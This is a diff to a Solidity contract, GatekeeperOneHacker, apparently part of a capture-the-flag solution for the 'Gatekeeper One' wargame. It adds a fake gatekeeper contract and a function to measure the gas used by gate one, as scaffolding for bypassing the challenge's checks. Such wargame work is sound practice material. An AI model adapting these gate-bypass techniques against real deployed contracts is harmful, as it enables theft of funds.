@@ -2,13 +2,16 @@
 pragma solidity ^0.8.0;
 
 import "./GatekeeperOne.sol";
+import "./GatekeeperOneFake.sol";
 
 contract GatekeeperOneHacker {
     GatekeeperOne public gatekeeper;
+    GatekeeperOneFake public fakeGatekeeper;
     uint256 constant public gasCostOfGateOne = 140;
     // event AfterGas(uint256 afterGas, uint256 beforeGas);
-    constructor(address _gatekeeper) {
+    constructor(address _gatekeeper, address _fakeGatekeeper) {
         gatekeeper = GatekeeperOne(_gatekeeper);
+        fakeGatekeeper = GatekeeperOneFake(_fakeGatekeeper);
     }
 
     function callEnter(bytes8 key, uint256 gasLimit) public returns (bool) {
@@ -36,6 +39,11 @@ contract GatekeeperOneHacker {
         require(msg.sender != tx.origin, "Failed gate 1");
         uint256 used = startGas - gasleft();
         return used;
+    }
+
+    function checkGateOneGas() external view returns (uint256) {
+        // This function checks the gas left after calling gateOne
+        return fakeGatekeeper.checkGateOne{gas: 1000000}();
     }
 
 
